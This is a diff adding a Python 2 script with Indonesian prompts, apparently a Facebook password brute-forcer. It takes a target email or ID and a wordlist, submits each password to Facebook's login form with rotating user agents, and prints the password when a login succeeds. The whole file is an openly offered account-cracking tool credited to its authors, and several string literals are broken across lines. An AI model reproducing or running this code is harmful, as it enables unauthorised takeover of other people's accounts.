@@ -1,0 +1,147 @@
+#!usr/bin/python2.7
+# -*- coding: UTF-8 -*-
+#Created by Tegar ID
+
+# SILAHKAN COSTUMISASI SENDIRI YA BOSQ #
+
+import os
+import sys
+import time
+import random
+import cookielib
+import mechanize
+
+wd = "" # dark
+GL = "" # Blue aqua
+BB = "" # Blue light
+YY = "" # Yellow light
+GG = "" # Green light
+WW = ""  # White light
+RR = "" # Red light
+CC = "" # Cyan light
+B = ""    # Blue
+Y = ""    # Yellow
+G = ""    # Green
+W = ""     # White
+R = ""    # Red
+C = ""    # Cyan
+
+def runntxt(s):
+        for noobs in s + '
+':
+                sys.stdout.write(noobs)
+                sys.stdout.flush()
+                time.sleep(10. / 2100)
+
+
+def banner():
+    os.system('clear')
+    print Y+"╔══════════════════════════════════════════╗"
+    print Y+"║ * Author   : Hack Gore                   ║"
+    print Y+"║ * FaceBook : Hacks Gore                  ║"
+    print Y+"║ * Whatsapp : 089525307729                ║"
+    print Y+"╚══════════════════════════════════════════╝"
+
+banner ()
+
+email_target = str(raw_input(GL+"Masukkan Email/Id Target =>  "))
+password_list = str(raw_input(GG+"Ketik pass.txt => "))
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
+
+def pil():
+                print GG+" "
+                g = str(raw_input("[?] Coba Lagi ?[y/n]: "))
+                if g == 'y' or g == 'Y':
+                    os.system('python2 force.py')
+                elif g == 'n' or g == 'N':
+                    print wd+"Keluar dari program..."
+                    sys.exit()
+                else:
+                    print RR+"Pilih yang bener cuk..."
+                    pil()
+
+def edit_wordlist():
+
+        print GG+" "
+        ed = str(raw_input("[?] Edit wordlist bos? [y/n]: "))
+        if ed == 'y' or ed == 'Y':
+                os.system('nano '+password_list)
+                pil()
+        elif ed == 'n' or ed == 'N':
+                print wd+"Keluar Dari Program..."
+                sys.exit()
+
+        else:
+                print RR+"Pilih yg bener..."
+                edit_wordlist()
+
+def main():
+        global noobs
+        noobs = mechanize.Browser()
+        cj = cookielib.LWPCookieJar()
+        noobs.set_handle_robots(False)
+        noobs.set_handle_redirect(True)
+        noobs.set_cookiejar(cj)
+        noobs.set_handle_equiv(True)
+        noobs.set_handle_referer(True)
+        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        runn_noobs()
+        life()
+        print " "
+        print RR+" wordlist tidak ada yg cocok..."
+        print " "
+def BLANK(hack_password):
+  try:
+        sys.stdout.write(GG+"
+[+] ["+email_target+"] Mencoba Password ==> ["+hack_password)
+        sys.stdout.flush()
+        noobs.addheaders = [('User-agent', random.choice(useragents))]
+        site = noobs.open(login)
+        noobs.select_form(nr = 0)
+        noobs.form['email'] = email_target
+        noobs.form['pass'] = hack_password
+        tom = noobs.submit()
+        mask = tom.geturl()
+        if mask != login and (not 'login_attempt' in mask):
+                        print " "
+                        print ("                S U C C E S S")
+                        print "          P A S S W O R D  F I N D "
+                        print RR+"+-------------------------------------------+"
+                        print (RR+"# ID / Email Target: {}").format(email_target)
+                        print (RR+"# Password Target: {}").format(hack_password)
+                        print " "
+                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
+                        sys.exit(1)
+
+
+  except KeyboardInterrupt:
+      print wd+"Stop......."
+      edit_wordlist()
+      sys.exit()
+def life():
+        global hack_password
+        password_nob = open(password_list, "r")
+        for hack_password in password_nob:
+                password_nob = hack_password.replace("
+","")
+                BLANK(hack_password)
+
+def runn_noobs():
+         global password_list
+
+         lop = GG+"[RG4]Black_Coder
+Creator by: Tegar ID
+
+
+         print lop
+         nuub = open(password_list, 'r')
+         nuub = nuub.readlines()
+         print wd+" [#] ID / Username Target: {}".format(email_target)
+         print wd+" [#] Jumlah Wordlist Saat Ini:", len(nuub),'password'
+         print wd+" [#] Tunggu Proses Cracking.........."
+         print " "
+
+if __name__=='__main__':
+        main()
